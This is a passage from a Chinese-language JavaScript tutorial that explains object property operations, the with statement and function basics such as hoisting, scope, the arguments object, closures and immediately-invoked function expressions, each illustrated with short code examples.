   数字键可以不加引号，因为会自动转成字符串。

   .. code:: javascript

      var obj = {
        0.7: 'Hello World'
      };
   
      obj['0.7'] // "Hello World"
      obj[0.7] // "Hello World"

   上面代码中，对象 ``obj`` 的数字键 ``0.7`` ，加不加引号都可以，因为会被自动转为字符串。

   注意，数值键名不能使用点运算符（因为会被当成小数点），只能使用方括号运算符。

   .. code:: javascript

      var obj = {
        123: 'hello world'
      };
   
      obj.123 // 报错
      obj[123] // "hello world"

   上面代码的第一个表达式，对数值键名 ``123`` 使用点运算符，结果报错。第二个表达式使用方括号运算符，结果就是正确的。

属性的赋值
~~~~~~~~

   点运算符和方括号运算符，不仅可以用来读取值，还可以用来赋值。

   .. code:: javascript

      var obj = {};
   
      obj.foo = 'Hello';
      obj['bar'] = 'World';

   上面代码中，分别使用点运算符和方括号运算符，对属性赋值。

   JavaScript 允许属性的“后绑定”，也就是说，你可以在任意时刻新增属性，没必要在定义对象的时候，就定义好属性。

   .. code:: javascript

      var obj = { p: 1 };
   
      // 等价于
   
      var obj = {};
      obj.p = 1;

属性的查看
~~~~~~~~

   查看一个对象本身的所有属性，可以使用 ``Object.keys`` 方法。

   .. code:: javascript

      var obj = {
        key1: 1,
        key2: 2
      };
   
      Object.keys(obj);
      // ['key1', 'key2']

属性的删除：delete 命令
~~~~~~~~~~~~~~~~~~~~

    ``delete`` 命令用于删除对象的属性，删除成功后返回 ``true`` 。

   .. code:: javascript

      var obj = { p: 1 };
      Object.keys(obj) // ["p"]
   
      delete obj.p // true
      obj.p // undefined
      Object.keys(obj) // []

   上面代码中， ``delete`` 命令删除对象 ``obj`` 的 ``p`` 属性。删除后，再读取 ``p`` 属性就会返回 ``undefined`` ，而且 ``Object.keys`` 方法的返回值也不再包括该属性。

   注意，删除一个不存在的属性， ``delete`` 不报错，而且返回 ``true`` 。

   .. code:: javascript

      var obj = {};
      delete obj.p // true

   上面代码中，对象 ``obj`` 并没有 ``p`` 属性，但是 ``delete`` 命令照样返回 ``true`` 。因此，不能根据 ``delete`` 命令的结果，认定某个属性是存在的。

   只有一种情况， ``delete`` 命令会返回 ``false`` ，那就是该属性存在，且不得删除。

   .. code:: javascript

      var obj = Object.defineProperty({}, 'p', {
        value: 123,
        configurable: false
      });
   
      obj.p // 123
      delete obj.p // false

   上面代码之中，对象 ``obj`` 的 ``p`` 属性是不能删除的，所以 ``delete`` 命令返回 ``false`` （关于 ``Object.defineProperty`` 方法的介绍，请看《标准库》的 Object 对象一章）。

   另外，需要注意的是， ``delete`` 命令只能删除对象本身的属性，无法删除继承的属性（关于继承参见《面向对象编程》章节）。

   .. code:: javascript

      var obj = {};
      delete obj.toString // true
      obj.toString // function toString() { [native code] }

   上面代码中， ``toString`` 是对象 ``obj`` 继承的属性，虽然 ``delete`` 命令返回 ``true`` ，但该属性并没有被删除，依然存在。这个例子还说明，即使 ``delete`` 返回 ``true`` ，该属性依然可能读取到值。

属性是否存在：in 运算符
~~~~~~~~~~~~~~~~~~~

    ``in`` 运算符用于检查对象是否包含某个属性（注意，检查的是键名，不是键值），如果包含就返回 ``true`` ，否则返回 ``false`` 。它的左边是一个字符串，表示属性名，右边是一个对象。

   .. code:: javascript

      var obj = { p: 1 };
      'p' in obj // true
      'toString' in obj // true

    ``in`` 运算符的一个问题是，它不能识别哪些属性是对象自身的，哪些属性是继承的。就像上面代码中，对象 ``obj`` 本身并没有 ``toString`` 属性，但是 ``in`` 运算符会返回 ``true`` ，因为这个属性是继承的。

   这时，可以使用对象的 ``hasOwnProperty`` 方法判断一下，是否为对象自身的属性。

   .. code:: javascript

      var obj = {};
      if ('toString' in obj) {
        console.log(obj.hasOwnProperty('toString')) // false
      }

属性的遍历：for...in 循环
~~~~~~~~~~~~~~~~~~~~~~

    ``for...in`` 循环用来遍历一个对象的全部属性。

   .. code:: javascript

      var obj = {a: 1, b: 2, c: 3};
   
      for (var i in obj) {
        console.log('键名：', i);
        console.log('键值：', obj[i]);
      }
      // 键名： a
      // 键值： 1
      // 键名： b
      // 键值： 2
      // 键名： c
      // 键值： 3

    ``for...in`` 循环有两个使用注意点。

   - 它遍历的是对象所有可遍历（enumerable）的属性，会跳过不可遍历的属性。
   - 它不仅遍历对象自身的属性，还遍历继承的属性。

   举例来说，对象都继承了 ``toString`` 属性，但是 ``for...in`` 循环不会遍历到这个属性。

   .. code:: javascript

      var obj = {};
   
      // toString 属性是存在的
      obj.toString // toString() { [native code] }
   
      for (var p in obj) {
        console.log(p);
      } // 没有任何输出

   上面代码中，对象 ``obj`` 继承了 ``toString`` 属性，该属性不会被 ``for...in`` 循环遍历到，因为它默认是“不可遍历”的。关于对象属性的可遍历性，参见《标准库》章节中 Object 一章的介绍。

   如果继承的属性是可遍历的，那么就会被 ``for...in`` 循环遍历到。但是，一般情况下，都是只想遍历对象自身的属性，所以使用 ``for...in`` 的时候，应该结合使用 ``hasOwnProperty`` 方法，在循环内部判断一下，某个属性是否为对象自身的属性。

   .. code:: javascript

      var person = { name: '老张' };
   
      for (var key in person) {
        if (person.hasOwnProperty(key)) {
          console.log(key);
        }
      }
      // name

with 语句
---------

    ``with`` 语句的格式如下：

   .. code:: javascript

      with (对象) {
        语句;
      }

   它的作用是操作同一个对象的多个属性时，提供一些书写的方便。

   .. code:: javascript

      // 例一
      var obj = {
        p1: 1,
        p2: 2,
      };
      with (obj) {
        p1 = 4;
        p2 = 5;
      }
      // 等同于
      obj.p1 = 4;
      obj.p2 = 5;
   
      // 例二
      with (document.links[0]){
        console.log(href);
        console.log(title);
        console.log(style);
      }
      // 等同于
      console.log(document.links[0].href);
      console.log(document.links[0].title);
      console.log(document.links[0].style);

   注意，如果 ``with`` 区块内部有变量的赋值操作，必须是当前对象已经存在的属性，否则会创造一个当前作用域的全局变量。

   .. code:: javascript

      var obj = {};
      with (obj) {
        p1 = 4;
        p2 = 5;
      }
   
      obj.p1 // undefined
      p1 // 4

   上面代码中，对象 ``obj`` 并没有 ``p1`` 属性，对 ``p1`` 赋值等于创造了一个全局变量 ``p1`` 。正确的写法应该是，先定义对象 ``obj`` 的属性 ``p1`` ，然后在 ``with`` 区块内操作它。

   这是因为 ``with`` 区块没有改变作用域，它的内部依然是当前作用域。这造成了 ``with`` 语句的一个很大的弊病，就是绑定对象不明确。

   .. code:: javascript

      with (obj) {
        console.log(x);
      }

   单纯从上面的代码块，根本无法判断 ``x`` 到底是全局变量，还是对象 ``obj`` 的一个属性。这非常不利于代码的除错和模块化，编译器也无法对这段代码进行优化，只能留到运行时判断，这就拖慢了运行速度。因此，建议不要使用 ``with`` 语句，可以考虑用一个临时变量代替 ``with`` 。

   .. code:: javascript

      with(obj1.obj2.obj3) {
        console.log(p1 + p2);
      }
   
      // 可以写成
      var temp = obj1.obj2.obj3;
      console.log(temp.p1 + temp.p2);

参考链接
-------

   - Dr. Axel Rauschmayer，[Object properties in JavaScript](http://www.2ality.com/2012/10/javascript-properties.html)
   - Lakshan Perera, [Revisiting JavaScript Objects](http://www.laktek.com/2012/12/29/revisiting-javascript-objects/)
   - Angus Croll, [The Secret Life of JavaScript Primitives](http://javascriptweblog.wordpress.com/2010/09/27/the-secret-life-of-javascript-primitives/)
   - Dr. Axel Rauschmayer, [JavaScript’s with statement and why it’s deprecated](http://www.2ality.com/2011/06/with-statement.html)

/🟠 函数
========

   函数是一段可以反复调用的代码块。函数还能接受输入的参数，不同的参数有唯一对应的返回值。

概述
---


函数的声明
~~~~~~~~

   JavaScript 有三种声明函数的方法。

   **（1）function 命令**

    ``function`` 命令声明的代码区块，就是一个函数。 ``function`` 命令后面是函数名，函数名后面是一对圆括号，里面是传入函数的参数。函数体放在大括号里面。

   .. code:: javascript

      function print(s) {
        console.log(s);
      }

   上面的代码命名了一个 ``print`` 函数，以后使用 ``print()`` 这种形式，就可以调用相应的代码。这叫做函数的声明（Function Declaration）。

   **（2）函数表达式**

   除了用 ``function`` 命令声明函数，还可以采用变量赋值的写法。

   .. code:: javascript

      var print = function(s) {
        console.log(s);
      };

   这种写法将一个匿名函数赋值给变量。这时，这个匿名函数又称函数表达式（Function Expression），因为赋值语句的等号右侧只能放表达式。

   采用函数表达式声明函数时， ``function`` 命令后面不带有函数名。如果加上函数名，该函数名只在函数体内部有效，在函数体外部无效。

   .. code:: javascript

      var print = function x(){
        console.log(typeof x);
      };
   
      x
      // ReferenceError: x is not defined
   
      print()
      // function

   上面代码在函数表达式中，加入了函数名 ``x`` 。这个 ``x`` 只在函数体内部可用，指代函数表达式本身，其他地方都不可用。这种写法的用处有两个，一是可以在函数体内部调用自身，二是方便除错（除错工具显示函数调用栈时，将显示函数名，而不再显示这里是一个匿名函数）。因此，下面的形式声明函数也非常常见。

   .. code:: javascript

      var f = function f() {};

   需要注意的是，函数的表达式需要在语句的结尾加上分号，表示语句结束。而函数的声明在结尾的大括号后面不用加分号。总的来说，这两种声明函数的方式，差别很细微，可以近似认为是等价的。

   **（3）Function 构造函数**

   第三种声明函数的方式是 ``Function`` 构造函数。

   .. code:: javascript

      var add = new Function(
        'x',
        'y',
        'return x + y'
      );
   
      // 等同于
      function add(x, y) {
        return x + y;
      }

   上面代码中， ``Function`` 构造函数接受三个参数，除了最后一个参数是 ``add`` 函数的“函数体”，其他参数都是 ``add`` 函数的参数。

   你可以传递任意数量的参数给 ``Function`` 构造函数，只有最后一个参数会被当做函数体，如果只有一个参数，该参数就是函数体。

   .. code:: javascript

      var foo = new Function(
        'return "hello world";'
      );
   
      // 等同于
      function foo() {
        return 'hello world';
      }

    ``Function`` 构造函数可以不使用 ``new`` 命令，返回结果完全一样。

   总的来说，这种声明函数的方式非常不直观，几乎无人使用。

函数的重复声明
~~~~~~~~~~~~

   如果同一个函数被多次声明，后面的声明就会覆盖前面的声明。

   .. code:: javascript

      function f() {
        console.log(1);
      }
      f() // 2
   
      function f() {
        console.log(2);
      }
      f() // 2

   上面代码中，后一次的函数声明覆盖了前面一次。而且，由于函数名的提升（参见下文），前一次声明在任何时候都是无效的，这一点要特别注意。

圆括号运算符，return 语句和递归
~~~~~~~~~~~~~~~~~~~~~~~~~~~

   调用函数时，要使用圆括号运算符。圆括号之中，可以加入函数的参数。

   .. code:: javascript

      function add(x, y) {
        return x + y;
      }
   
      add(1, 1) // 2

   上面代码中，函数名后面紧跟一对圆括号，就会调用这个函数。

   函数体内部的 ``return`` 语句，表示返回。JavaScript 引擎遇到 ``return`` 语句，就直接返回 ``return`` 后面的那个表达式的值，后面即使还有语句，也不会得到执行。也就是说， ``return`` 语句所带的那个表达式，就是函数的返回值。 ``return`` 语句不是必需的，如果没有的话，该函数就不返回任何值，或者说返回 ``undefined`` 。

   函数可以调用自身，这就是递归（recursion）。下面就是通过递归，计算斐波那契数列的代码。

   .. code:: javascript

      function fib(num) {
        if (num === 0) return 0;
        if (num === 1) return 1;
        return fib(num - 2) + fib(num - 1);
      }
   
      fib(6) // 8

   上面代码中， ``fib`` 函数内部又调用了 ``fib`` ，计算得到斐波那契数列的第6个元素是8。

第一等公民
~~~~~~~~

   JavaScript 语言将函数看作一种值，与其它值（数值、字符串、布尔值等等）地位相同。凡是可以使用值的地方，就能使用函数。比如，可以把函数赋值给变量和对象的属性，也可以当作参数传入其他函数，或者作为函数的结果返回。函数只是一个可以执行的值，此外并无特殊之处。

   由于函数与其他数据类型地位平等，所以在 JavaScript 语言中又称函数为第一等公民。

   .. code:: javascript

      function add(x, y) {
        return x + y;
      }
   
      // 将函数赋值给一个变量
      var operator = add;
   
      // 将函数作为参数和返回值
      function a(op){
        return op;
      }
      a(add)(1, 1)
      // 2

函数名的提升
~~~~~~~~~~

   JavaScript 引擎将函数名视同变量名，所以采用 ``function`` 命令声明函数时，整个函数会像变量声明一样，被提升到代码头部。所以，下面的代码不会报错。

   .. code:: javascript

      f();
   
      function f() {}

   表面上，上面代码好像在声明之前就调用了函数 ``f`` 。但是实际上，由于“变量提升”，函数 ``f`` 被提升到了代码头部，也就是在调用之前已经声明了。但是，如果采用赋值语句定义函数，JavaScript 就会报错。

   .. code:: javascript

      f();
      var f = function (){};
      // TypeError: undefined is not a function

   上面的代码等同于下面的形式。

   .. code:: javascript

      var f;
      f();
      f = function () {};

   上面代码第二行，调用 ``f`` 的时候， ``f`` 只是被声明了，还没有被赋值，等于 ``undefined`` ，所以会报错。

   注意，如果像下面例子那样，采用 ``function`` 命令和 ``var`` 赋值语句声明同一个函数，由于存在函数提升，最后会采用 ``var`` 赋值语句的定义。

   .. code:: javascript

      var f = function () {
        console.log('1');
      }
   
      function f() {
        console.log('2');
      }
   
      f() // 1

   上面例子中，表面上后面声明的函数 ``f`` ，应该覆盖前面的 ``var`` 赋值语句，但是由于存在函数提升，实际上正好反过来。

函数的属性和方法
-------------


name 属性
~~~~~~~~~

   函数的 ``name`` 属性返回函数的名字。

   .. code:: javascript

      function f1() {}
      f1.name // "f1"

   如果是通过变量赋值定义的函数，那么 ``name`` 属性返回变量名。

   .. code:: javascript

      var f2 = function () {};
      f2.name // "f2"

   但是，上面这种情况，只有在变量的值是一个匿名函数时才是如此。如果变量的值是一个具名函数，那么 ``name`` 属性返回 ``function`` 关键字之后的那个函数名。

   .. code:: javascript

      var f3 = function myName() {};
      f3.name // 'myName'

   上面代码中， ``f3.name`` 返回函数表达式的名字。注意，真正的函数名还是 ``f3`` ，而 ``myName`` 这个名字只在函数体内部可用。

    ``name`` 属性的一个用处，就是获取参数函数的名字。

   .. code:: javascript

      var myFunc = function () {};
   
      function test(f) {
        console.log(f.name);
      }
   
      test(myFunc) // myFunc

   上面代码中，函数 ``test`` 内部通过 ``name`` 属性，就可以知道传入的参数是什么函数。

length 属性
~~~~~~~~~~

   函数的 ``length`` 属性返回函数预期传入的参数个数，即函数定义之中的参数个数。

   .. code:: javascript

      function f(a, b) {}
      f.length // 2

   上面代码定义了空函数 ``f`` ，它的 ``length`` 属性就是定义时的参数个数。不管调用时输入了多少个参数， ``length`` 属性始终等于2。

    ``length`` 属性提供了一种机制，判断定义时和调用时参数的差异，以便实现面向对象编程的“方法重载”（overload）。

toString()
~~~~~~~~~~~

   函数的 ``toString()`` 方法返回一个字符串，内容是函数的源码。

   .. code:: javascript

      function f() {
        a();
        b();
        c();
      }
   
      f.toString()
      // function f() {
      //  a();
      //  b();
      //  c();
      // }

   上面示例中，函数 ``f`` 的 ``toString()`` 方法返回了 ``f`` 的源码，包含换行符在内。

   对于那些原生的函数， ``toString()`` 方法返回 ``function (){[native code]}`` 。

   .. code:: javascript

      Math.sqrt.toString()
      // "function sqrt() { [native code] }"

   上面代码中， ``Math.sqrt()`` 是 JavaScript 引擎提供的原生函数， ``toString()`` 方法就返回原生代码的提示。

   函数内部的注释也可以返回。

   .. code:: javascript

      function f() {/*
        这是一个
        多行注释
      */}
   
      f.toString()
      // "function f(){/*
      //   这是一个
      //   多行注释
      // */}"

   利用这一点，可以变相实现多行字符串。

   .. code:: javascript

      var multiline = function (fn) {
        var arr = fn.toString().split('\n');
        return arr.slice(1, arr.length - 1).join('\n');
      };
   
      function f() {/*
        这是一个
        多行注释
      */}
   
      multiline(f);
      // " 这是一个
      //   多行注释"

   上面示例中，函数 ``f`` 内部有一个多行注释， ``toString()`` 方法拿到 ``f`` 的源码后，去掉首尾两行，就得到了一个多行字符串。

函数作用域
--------


定义
~~~

   作用域（scope）指的是变量存在的范围。在 ES5 的规范中，JavaScript 只有两种作用域：一种是全局作用域，变量在整个程序中一直存在，所有地方都可以读取；另一种是函数作用域，变量只在函数内部存在。ES6 又新增了块级作用域，本教程不涉及。

   对于顶层函数来说，函数外部声明的变量就是全局变量（global variable），它可以在函数内部读取。

   .. code:: javascript

      var v = 1;
   
      function f() {
        console.log(v);
      }
   
      f()
      // 1

   上面的代码表明，函数 ``f`` 内部可以读取全局变量 ``v`` 。

   在函数内部定义的变量，外部无法读取，称为“局部变量”（local variable）。

   .. code:: javascript

      function f(){
        var v = 1;
      }
   
      v // ReferenceError: v is not defined

   上面代码中，变量 ``v`` 在函数内部定义，所以是一个局部变量，函数之外就无法读取。

   函数内部定义的变量，会在该作用域内覆盖同名全局变量。

   .. code:: javascript

      var v = 1;
   
      function f(){
        var v = 2;
        console.log(v);
      }
   
      f() // 2
      v // 1

   上面代码中，变量 ``v`` 同时在函数的外部和内部有定义。结果，在函数内部定义，局部变量 ``v`` 覆盖了全局变量 ``v`` 。

   注意，对于 ``var`` 命令来说，局部变量只能在函数内部声明，在其他区块中声明，一律都是全局变量。

   .. code:: javascript

      if (true) {
        var x = 5;
      }
      console.log(x);  // 5

   上面代码中，变量 ``x`` 在条件判断区块之中声明，结果就是一个全局变量，可以在区块之外读取。

函数内部的变量提升
~~~~~~~~~~~~~~~

   与全局作用域一样，函数作用域内部也会产生“变量提升”现象。 ``var`` 命令声明的变量，不管在什么位置，变量声明都会被提升到函数体的头部。

   .. code:: javascript

      function foo(x) {
        if (x > 100) {
          var tmp = x - 100;
        }
      }
   
      // 等同于
      function foo(x) {
        var tmp;
        if (x > 100) {
          tmp = x - 100;
        };
      }

函数本身的作用域
~~~~~~~~~~~~~

   函数本身也是一个值，也有自己的作用域。它的作用域与变量一样，就是其声明时所在的作用域，与其运行时所在的作用域无关。

   .. code:: javascript

      var a = 1;
      var x = function () {
        console.log(a);
      };
   
      function f() {
        var a = 2;
        x();
      }
   
      f() // 1

   上面代码中，函数 ``x`` 是在函数 ``f`` 的外部声明的，所以它的作用域绑定外层，内部变量 ``a`` 不会到函数 ``f`` 体内取值，所以输出 ``1`` ，而不是 ``2`` 。

   总之，函数执行时所在的作用域，是定义时的作用域，而不是调用时所在的作用域。

   很容易犯错的一点是，如果函数 ``A`` 调用函数 ``B`` ，却没考虑到函数 ``B`` 不会引用函数 ``A`` 的内部变量。

   .. code:: javascript

      var x = function () {
        console.log(a);
      };
   
      function y(f) {
        var a = 2;
        f();
      }
   
      y(x)
      // ReferenceError: a is not defined

   上面代码将函数 ``x`` 作为参数，传入函数 ``y`` 。但是，函数 ``x`` 是在函数 ``y`` 体外声明的，作用域绑定外层，因此找不到函数 ``y`` 的内部变量 ``a`` ，导致报错。

   同样的，函数体内部声明的函数，作用域绑定函数体内部。

   .. code:: javascript

      function foo() {
        var x = 1;
        function bar() {
          console.log(x);
        }
        return bar;
      }
   
      var x = 2;
      var f = foo();
      f() // 1

   上面代码中，函数 ``foo`` 内部声明了一个函数 ``bar`` ， ``bar`` 的作用域绑定 ``foo`` 。当我们在 ``foo`` 外部取出 ``bar`` 执行时，变量 ``x`` 指向的是 ``foo`` 内部的 ``x`` ，而不是 ``foo`` 外部的 ``x`` 。正是这种机制，构成了下文要讲解的“闭包”现象。

参数
---


概述
~~~

   函数运行的时候，有时需要提供外部数据，不同的外部数据会得到不同的结果，这种外部数据就叫参数。

   .. code:: javascript

      function square(x) {
        return x * x;
      }
   
      square(2) // 4
      square(3) // 9

   上式的 ``x`` 就是 ``square`` 函数的参数。每次运行的时候，需要提供这个值，否则得不到结果。

参数的省略
~~~~~~~~

   函数参数不是必需的，JavaScript 允许省略参数。

   .. code:: javascript

      function f(a, b) {
        return a;
      }
   
      f(1, 2, 3) // 1
      f(1) // 1
      f() // undefined
   
      f.length // 2

   上面代码的函数 ``f`` 定义了两个参数，但是运行时无论提供多少个参数（或者不提供参数），JavaScript 都不会报错。省略的参数的值就变为 ``undefined`` 。需要注意的是，函数的 ``length`` 属性与实际传入的参数个数无关，只反映函数预期传入的参数个数。

   但是，没有办法只省略靠前的参数，而保留靠后的参数。如果一定要省略靠前的参数，只有显式传入 ``undefined`` 。

   .. code:: javascript

      function f(a, b) {
        return a;
      }
   
      f( , 1) // SyntaxError: Unexpected token ,(…)
      f(undefined, 1) // undefined

   上面代码中，如果省略第一个参数，就会报错。

传递方式
~~~~~~~

   函数参数如果是原始类型的值（数值、字符串、布尔值），传递方式是传值传递（passes by value）。这意味着，在函数体内修改参数值，不会影响到函数外部。

   .. code:: javascript

      var p = 2;
   
      function f(p) {
        p = 3;
      }
      f(p);
   
      p // 2

   上面代码中，变量 ``p`` 是一个原始类型的值，传入函数 ``f`` 的方式是传值传递。因此，在函数内部， ``p`` 的值是原始值的拷贝，无论怎么修改，都不会影响到原始值。

   但是，如果函数参数是复合类型的值（数组、对象、其他函数），传递方式是传址传递（pass by reference）。也就是说，传入函数的原始值的地址，因此在函数内部修改参数，将会影响到原始值。

   .. code:: javascript

      var obj = { p: 1 };
   
      function f(o) {
        o.p = 2;
      }
      f(obj);
   
      obj.p // 2

   上面代码中，传入函数 ``f`` 的是参数对象 ``obj`` 的地址。因此，在函数内部修改 ``obj`` 的属性 ``p`` ，会影响到原始值。

   注意，如果函数内部修改的，不是参数对象的某个属性，而是替换掉整个参数，这时不会影响到原始值。

   .. code:: javascript

      var obj = [1, 2, 3];
   
      function f(o) {
        o = [2, 3, 4];
      }
      f(obj);
   
      obj // [1, 2, 3]

   上面代码中，在函数 ``f()`` 内部，参数对象 ``obj`` 被整个替换成另一个值。这时不会影响到原始值。这是因为，形式参数（ ``o`` ）的值实际是参数 ``obj`` 的地址，重新对 ``o`` 赋值导致 ``o`` 指向另一个地址，保存在原地址上的值当然不受影响。

同名参数
~~~~~~~

   如果有同名的参数，则取最后出现的那个值。

   .. code:: javascript

      function f(a, a) {
        console.log(a);
      }
   
      f(1, 2) // 2

   上面代码中，函数 ``f()`` 有两个参数，且参数名都是 ``a`` 。取值的时候，以后面的 ``a`` 为准，即使后面的 ``a`` 没有值或被省略，也是以其为准。

   .. code:: javascript

      function f(a, a) {
        console.log(a);
      }
   
      f(1) // undefined

   调用函数 ``f()`` 的时候，没有提供第二个参数， ``a`` 的取值就变成了 ``undefined`` 。这时，如果要获得第一个 ``a`` 的值，可以使用 ``arguments`` 对象。

   .. code:: javascript

      function f(a, a) {
        console.log(arguments[0]);
      }
   
      f(1) // 1

arguments 对象
~~~~~~~~~~~~~~

   **（1）定义**

   由于 JavaScript 允许函数有不定数目的参数，所以需要一种机制，可以在函数体内部读取所有参数。这就是 ``arguments`` 对象的由来。

    ``arguments`` 对象包含了函数运行时的所有参数， ``arguments[0]`` 就是第一个参数， ``arguments[1]`` 就是第二个参数，以此类推。这个对象只有在函数体内部，才可以使用。

   .. code:: javascript

      var f = function (one) {
        console.log(arguments[0]);
        console.log(arguments[1]);
        console.log(arguments[2]);
      }
   
      f(1, 2, 3)
      // 1
      // 2
      // 3

   正常模式下， ``arguments`` 对象可以在运行时修改。

   .. code:: javascript

      var f = function(a, b) {
        arguments[0] = 3;
        arguments[1] = 2;
        return a + b;
      }
   
      f(1, 1) // 5

   上面代码中，函数 ``f()`` 调用时传入的参数，在函数内部被修改成 ``3`` 和 ``2`` 。

   严格模式下， ``arguments`` 对象与函数参数不具有联动关系。也就是说，修改 ``arguments`` 对象不会影响到实际的函数参数。

   .. code:: javascript

      var f = function(a, b) {
        'use strict'; // 开启严格模式
        arguments[0] = 3;
        arguments[1] = 2;
        return a + b;
      }
   
      f(1, 1) // 2

   上面代码中，函数体内是严格模式，这时修改 ``arguments`` 对象，不会影响到真实参数 ``a`` 和 ``b`` 。

   通过 ``arguments`` 对象的 ``length`` 属性，可以判断函数调用时到底带几个参数。

   .. code:: javascript

      function f() {
        return arguments.length;
      }
   
      f(1, 2, 3) // 3
      f(1) // 1
      f() // 0

   **（2）与数组的关系**

   需要注意的是，虽然 ``arguments`` 很像数组，但它是一个对象。数组专有的方法（比如 ``slice`` 和 ``forEach`` ），不能在 ``arguments`` 对象上直接使用。

   如果要让 ``arguments`` 对象使用数组方法，真正的解决方法是将 ``arguments`` 转为真正的数组。下面是两种常用的转换方法： ``slice`` 方法和逐一填入新数组。

   .. code:: javascript

      var args = Array.prototype.slice.call(arguments);
   
      // 或者
      var args = [];
      for (var i = 0; i < arguments.length; i++) {
        args.push(arguments[i]);
      }

   **（3）callee 属性**

    ``arguments`` 对象带有一个 ``callee`` 属性，返回它所对应的原函数。

   .. code:: javascript

      var f = function () {
        console.log(arguments.callee === f);
      }
   
      f() // true

   可以通过 ``arguments.callee`` ，达到调用函数自身的目的。这个属性在严格模式里面是禁用的，因此不建议使用。

函数的其他知识点
-------------


闭包
~~~

   闭包（closure）是 JavaScript 语言的一个难点，也是它的特色，很多高级应用都要依靠闭包实现。

   理解闭包，首先必须理解变量作用域。前面提到，JavaScript 有两种作用域：全局作用域和函数作用域。函数内部可以直接读取全局变量。

   .. code:: javascript

      var n = 999;
   
      function f1() {
        console.log(n);
      }
      f1() // 999

   上面代码中，函数 ``f1`` 可以读取全局变量 ``n`` 。

   但是，正常情况下，函数外部无法读取函数内部声明的变量。

   .. code:: javascript

      function f1() {
        var n = 999;
      }
   
      console.log(n)
      // Uncaught ReferenceError: n is not defined(

   上面代码中，函数 ``f1`` 内部声明的变量 ``n`` ，函数外是无法读取的。

   如果出于种种原因，需要得到函数内的局部变量。正常情况下，这是办不到的，只有通过变通方法才能实现。那就是在函数的内部，再定义一个函数。

   .. code:: javascript

      function f1() {
        var n = 999;
        function f2() {
      　　console.log(n); // 999
        }
      }

   上面代码中，函数 ``f2`` 就在函数 ``f1`` 内部，这时 ``f1`` 内部的所有局部变量，对 ``f2`` 都是可见的。但是反过来就不行， ``f2`` 内部的局部变量，对 ``f1`` 就是不可见的。这就是 JavaScript 语言特有的"链式作用域"结构（chain scope），子对象会一级一级地向上寻找所有父对象的变量。所以，父对象的所有变量，对子对象都是可见的，反之则不成立。

   既然 ``f2`` 可以读取 ``f1`` 的局部变量，那么只要把 ``f2`` 作为返回值，我们不就可以在 ``f1`` 外部读取它的内部变量了吗！

   .. code:: javascript

      function f1() {
        var n = 999;
        function f2() {
          console.log(n);
        }
        return f2;
      }
   
      var result = f1();
      result(); // 999

   上面代码中，函数 ``f1`` 的返回值就是函数 ``f2`` ，由于 ``f2`` 可以读取 ``f1`` 的内部变量，所以就可以在外部获得 ``f1`` 的内部变量了。

   闭包就是函数 ``f2`` ，即能够读取其他函数内部变量的函数。由于在 JavaScript 语言中，只有函数内部的子函数才能读取内部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数”。闭包最大的特点，就是它可以“记住”诞生的环境，比如 ``f2`` 记住了它诞生的环境 ``f1`` ，所以从 ``f2`` 可以得到 ``f1`` 的内部变量。在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。

   闭包的最大用处有两个，一个是可以读取外层函数内部的变量，另一个就是让这些变量始终保持在内存中，即闭包可以使得它诞生环境一直存在。请看下面的例子，闭包使得内部变量记住上一次调用时的运算结果。

   .. code:: javascript

      function createIncrementor(start) {
        return function () {
          return start++;
        };
      }
   
      var inc = createIncrementor(5);
   
      inc() // 5
      inc() // 6
      inc() // 7

   上面代码中， ``start`` 是函数 ``createIncrementor`` 的内部变量。通过闭包， ``start`` 的状态被保留了，每一次调用都是在上一次调用的基础上进行计算。从中可以看到，闭包 ``inc`` 使得函数 ``createIncrementor`` 的内部环境，一直存在。所以，闭包可以看作是函数内部作用域的一个接口。

   为什么闭包能够返回外层函数的内部变量？原因是闭包（上例的 ``inc`` ）用到了外层变量（ ``start`` ），导致外层函数（ ``createIncrementor`` ）不能从内存释放。只要闭包没有被垃圾回收机制清除，外层函数提供的运行环境也不会被清除，它的内部变量就始终保存着当前值，供闭包读取。

   闭包的另一个用处，是封装对象的私有属性和私有方法。

   .. code:: javascript

      function Person(name) {
        var _age;
        function setAge(n) {
          _age = n;
        }
        function getAge() {
          return _age;
        }
   
        return {
          name: name,
          getAge: getAge,
          setAge: setAge
        };
      }
   
      var p1 = Person('张三');
      p1.setAge(25);
      p1.getAge() // 25

   上面代码中，函数 ``Person`` 的内部变量 ``_age`` ，通过闭包 ``getAge`` 和 ``setAge`` ，变成了返回对象 ``p1`` 的私有变量。

   注意，外层函数每次运行，都会生成一个新的闭包，而这个闭包又会保留外层函数的内部变量，所以内存消耗很大。因此不能滥用闭包，否则会造成网页的性能问题。

立即调用的函数表达式（IIFE）
~~~~~~~~~~~~~~~~~~~~~~~~

   根据 JavaScript 的语法，圆括号 ``()`` 跟在函数名之后，表示调用该函数。比如， ``print()`` 就表示调用 ``print`` 函数。

   有时，我们需要在定义函数之后，立即调用该函数。这时，你不能在函数的定义之后加上圆括号，这会产生语法错误。

   .. code:: javascript

      function(){ /* code */ }();
      // SyntaxError: Unexpected token (

   产生这个错误的原因是， ``function`` 这个关键字既可以当作语句，也可以当作表达式。

   .. code:: javascript

      // 语句
      function f() {}
   
      // 表达式
      var f = function f() {}

   当作表达式时，函数可以定义后直接加圆括号调用。

   .. code:: javascript

      var f = function f(){ return 1}();
      f // 1

   上面的代码中，函数定义后直接加圆括号调用，没有报错。原因就是 ``function`` 作为表达式，引擎就把函数定义当作一个值。这种情况下，就不会报错。

   为了避免解析的歧义，JavaScript 规定，如果 ``function`` 关键字出现在行首，一律解释成语句。因此，引擎看到行首是 ``function`` 关键字之后，认为这一段都是函数的定义，不应该以圆括号结尾，所以就报错了。

   函数定义后立即调用的解决方法，就是不要让 ``function`` 出现在行首，让引擎将其理解成一个表达式。最简单的处理，就是将其放在一个圆括号里面。

   .. code:: javascript

      (function(){ /* code */ }());
      // 或者
      (function(){ /* code */ })();

   上面两种写法都是以圆括号开头，引擎就会认为后面跟的是一个表达式，而不是函数定义语句，所以就避免了错误。这就叫做“立即调用的函数表达式”（Immediately-Invoked Function Expression），简称 IIFE。

   注意，上面两种写法最后的分号都是必须的。如果省略分号，遇到连着两个 IIFE，可能就会报错。

   .. code:: javascript

      // 报错
      (function(){ /* code */ }())
      (function(){ /* code */ }())

   上面代码的两行之间没有分号，JavaScript 会将它们连在一起解释，将第二行解释为第一行的参数。

   推而广之，任何让解释器以表达式来处理函数定义的方法，都能产生同样的效果，比如下面三种写法。

   .. code:: javascript

      var i = function(){ return 10; }();
